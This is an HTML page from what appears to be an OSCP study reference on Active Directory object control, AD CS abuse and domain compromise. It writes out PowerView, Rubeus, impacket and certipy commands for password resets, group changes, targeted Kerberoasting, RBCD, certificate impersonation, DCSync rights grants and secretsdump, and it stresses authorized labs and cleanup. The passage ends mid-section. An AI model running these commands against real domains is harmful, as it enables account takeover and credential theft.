@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Object Control, AD CS and Domain Compromise — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#directory-object-control">Directory-object control</a><ul><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#password-reset">Password reset</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#group-membership">Group membership</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#targeted-kerberoast-through-spn-write">Targeted Kerberoast through SPN write</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#owner-and-dacl-transitions">Owner and DACL transitions</a></li></ul></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#conditional-gpo-control">Conditional: GPO control</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#conditional-delegation-paths">Conditional: delegation paths</a><ul><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#resource-based-constrained-delegation">Resource-based constrained delegation</a></li></ul></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#conditional-ad-cs-enumeration">Conditional: AD CS enumeration</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#conditional-certificate-request-and-authentication">Conditional: certificate request and authentication</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#conditional-esc4template-write-boundary">Conditional: ESC4/template-write boundary</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#dcsync-replication-rights">DCSync replication rights</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#conditional-high-impact-ticket-forging-concepts">Conditional: high-impact ticket-forging concepts</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#bloodyad--linux-side-ldap-reads-and-permission-backed-writes">bloodyAD — Linux-side LDAP reads and permission-backed writes</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#delegated-reads--laps-and-gmsa-material">Delegated reads — LAPS and gMSA material</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#shadow-credentials--object-key-write-pkinit-then-cleanup">Shadow credentials — object-key write, PKINIT, then cleanup</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#passthecert--schannelldap-when-the-certificate-is-usable-there">PassTheCert — Schannel/LDAP when the certificate is usable there</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#powermad--create-an-account-only-when-the-chosen-ad-path-needs-it">Powermad — create an account only when the chosen AD path needs it</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights">gMSA — obtain a decoded hash only with managed-password read rights</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#sources">Sources</a></li></ul></details><ul><li><details open><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details open><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/" aria-current="page">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="object-control-ad-cs-and-domain-compromise">Object Control, AD CS and Domain Compromise</h1>
+<p><a href="/oscp/reference/06-ad-lateral-movement/">← Stage index</a> | <a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Domain mapping</a> | <a href="/oscp/cheatsheets/active-directory/">AD cheatsheet</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a>; <a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></p>
+<blockquote>
+<p><strong>Active Block 11 core:</strong> user, group, SPN and DACL-backed identity transitions, plus the rights required for DCSync.</p>
+<p><strong>Conditional supplements:</strong> GPO abuse, delegation/RBCD and AD CS remain evidence-led branches rather than core Block 11 study.</p>
+</blockquote>
+<h2 id="directory-object-control">Directory-object control</h2>
+<blockquote>
+<p><strong>Model:</strong> controlled principal → effective ACE → target object/type → permitted modification → authentication/authorization effect → cleanup.</p>
+</blockquote>
+<p>Enumerate a target's ACL with resolved GUIDs:</p>
+<pre><code class="language-powershell">Import-Module .\PowerView.ps1
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' }
+</code></pre>
+<p>Resolve trustees:</p>
+<pre><code class="language-powershell">ConvertFrom-SID 'S-1-5-21-...'
+Get-DomainObject -Identity 'S-1-5-21-...' | Select-Object samaccountname,objectclass
+</code></pre>
+<p>Common effects require different rights:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Right/object</th><th>Possible controlled effect</th><th>Validation needed</th></tr></thead><tbody><tr><td><code>GenericAll</code>/password-reset extended right on user</td><td>Reset the user's password</td><td>Effective trustee, account state, protected-object behavior</td></tr><tr><td><code>GenericAll</code> or effective member-attribute write on group</td><td>Add a controlled principal to the group</td><td>Target group, nesting and a refreshed logon token</td></tr><tr><td><code>GenericWrite</code>/SPN-property write on user</td><td>Add a temporary SPN, request a TGS and remove it</td><td>Exact property right, duplicate-SPN checks and cleanup</td></tr><tr><td><code>WriteDacl</code></td><td>Grant a narrower right</td><td>Ability to write DACL and restore original ACL</td></tr><tr><td><code>WriteOwner</code></td><td>Change owner, then possibly DACL</td><td>Owner semantics and cleanup</td></tr><tr><td>Computer-object write</td><td>RBCD-related attribute change</td><td>Machine account/control, SPN/Kerberos and target service</td></tr></tbody></table>
+<h3 id="password-reset">Password reset</h3>
+<p>A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored.</p>
+<pre><code class="language-powershell">$Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force
+Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose
+net user TARGET_USER TEMP_PASSWORD /domain
+</code></pre>
+<p>Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists.</p>
+<h3 id="group-membership">Group membership</h3>
+<pre><code class="language-powershell">Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose
+Get-DomainGroupMember -Identity TARGET_GROUP |
+  Where-Object { $_.MemberName -eq 'CONTROLLED_USER' }
+
+# Built-in alternative
+net group TARGET_GROUP CONTROLLED_USER /add /domain
+</code></pre>
+<p>A current session may not receive the new group SID until a fresh logon. Validate with a new session/token, then remove the membership after the authorized objective:</p>
+<pre><code class="language-powershell">Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false
+net group TARGET_GROUP CONTROLLED_USER /delete /domain
+</code></pre>
+<h3 id="targeted-kerberoast-through-spn-write">Targeted Kerberoast through SPN write</h3>
+<p>If the effective right permits writing <code>servicePrincipalName</code> on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in <a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and identity transitions</a>.</p>
+<pre><code class="language-powershell">setspn -S TEMP/TARGET_USER TARGET_USER
+setspn -Q TEMP/TARGET_USER
+Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
+setspn -D TEMP/TARGET_USER TARGET_USER
+</code></pre>
+<h3 id="owner-and-dacl-transitions">Owner and DACL transitions</h3>
+<p><code>WriteOwner</code> can make the controlled identity the owner; ownership may then permit a DACL change. <code>WriteDacl</code> can grant only the narrower right needed for the intended transition.</p>
+<pre><code class="language-powershell">Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose
+Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
+
+# Group-membership variant
+Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose
+
+# Remove the ACE after the authorized objective
+Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
+</code></pre>
+<p>Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.</p>
+<h2 id="conditional-gpo-control">Conditional: GPO control</h2>
+<p>Identify GPOs and links:</p>
+<pre><code class="language-powershell">Get-DomainGPO
+Get-DomainOU | Select-Object name,distinguishedname,gplink
+Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' }
+</code></pre>
+<p>For a candidate, prove:</p>
+<ol>
+<li>the controlled principal can edit both the directory object and relevant SYSVOL policy files;</li>
+<li>the GPO is linked to the OU containing the intended test host/user;</li>
+<li>security filtering and WMI filters include that subject;</li>
+<li>the configured preference/task/script runs in the expected context; and</li>
+<li>policy refresh or another predictable trigger will occur.</li>
+</ol>
+<p>SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action:</p>
+<pre><code class="language-cmd">SharpGPOAbuse.exe --help
+gpresult /r
+gpupdate /force
+</code></pre>
+<p>Back up the GPO, restrict the target/scope, document the exact change and restore it after validation.</p>
+<h2 id="conditional-delegation-paths">Conditional: delegation paths</h2>
+<p>Enumerate before attempting any ticket operation:</p>
+<pre><code class="language-powershell">Get-DomainComputer -Unconstrained | Select-Object dnshostname
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname
+Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
+Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
+</code></pre>
+<pre><code class="language-bash">impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
+</code></pre>
+<p>Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN:</p>
+<pre><code class="language-bash">impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \
+  -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD'
+export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
+</code></pre>
+<p>Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material.</p>
+<h3 id="resource-based-constrained-delegation">Resource-based constrained delegation</h3>
+<blockquote>
+<p><strong>Prerequisite:</strong> effective write control over the target computer's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> plus control of a principal with an SPN (often a lab computer account).</p>
+</blockquote>
+<pre><code class="language-bash">impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
+  -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP
+
+impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
+  -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
+
+impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \
+  -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD'
+</code></pre>
+<p>Cleanup after the lab objective:</p>
+<pre><code class="language-bash">impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
+  -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
+impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
+  -delete -dc-ip DC_IP
+</code></pre>
+<p>Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.</p>
+<h2 id="conditional-ad-cs-enumeration">Conditional: AD CS enumeration</h2>
+<blockquote>
+<p><strong>Prerequisite:</strong> reachable CA/DC and a valid domain identity. <strong>Decisive output:</strong> a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path.</p>
+</blockquote>
+<p>Package names vary:</p>
+<pre><code class="language-bash">command -v certipy-ad || command -v certipy
+certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -enabled -vulnerable -stdout
+</code></pre>
+<p>Review:</p>
+<ul>
+<li>CA name and host;</li>
+<li>template name and whether it is enabled/published;</li>
+<li>who can enroll;</li>
+<li>client-authentication EKUs/purpose;</li>
+<li>subject/SAN supply controls;</li>
+<li>manager approval/signature requirements;</li>
+<li>template owner and modification rights;</li>
+<li>web enrollment/relay-related configuration where relevant.</li>
+</ul>
+<p>An <code>ESC</code> label is a candidate classification. Manually validate the properties and the controlled identity's effective rights.</p>
+<h2 id="conditional-certificate-request-and-authentication">Conditional: certificate request and authentication</h2>
+<p>Generic request after validating a specific template:</p>
+<pre><code class="language-bash">certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -target DC_HOST -ca CA_NAME -template TEMPLATE
+</code></pre>
+<p>An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing:</p>
+<pre><code class="language-bash">certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -target DC_HOST -ca CA_NAME -template TEMPLATE \
+  -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID'
+</code></pre>
+<pre><code class="language-bash">certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
+</code></pre>
+<p>Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication.</p>
+<h2 id="conditional-esc4template-write-boundary">Conditional: ESC4/template-write boundary</h2>
+<p>Before any authorized template change, save configuration:</p>
+<pre><code class="language-bash">certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -template TEMPLATE -save-configuration template-backup.json
+</code></pre>
+<p>Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect <code>certipy-ad template -h</code> for the installed version, and restore the saved configuration after the demonstration.</p>
+<h2 id="dcsync-replication-rights">DCSync replication rights</h2>
+<blockquote>
+<p><strong>Prerequisite:</strong> effective domain-root rights equivalent to <code>Replicating Directory Changes</code> plus <code>Replicating Directory Changes All</code> (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient.</p>
+</blockquote>
+<p>Validate ACLs at the domain root:</p>
+<pre><code class="language-powershell">Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs |
+  Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' }
+</code></pre>
+<p>A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path:</p>
+<pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
+
+# Remove the delegated replication ACE after the authorized objective
+Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
+</code></pre>
+<p>Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change.</p>
+<p>Request one approved test account rather than dumping the directory:</p>
+<pre><code class="language-bash">impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \
+  'DOMAIN/USER:PASSWORD@DC_HOST'
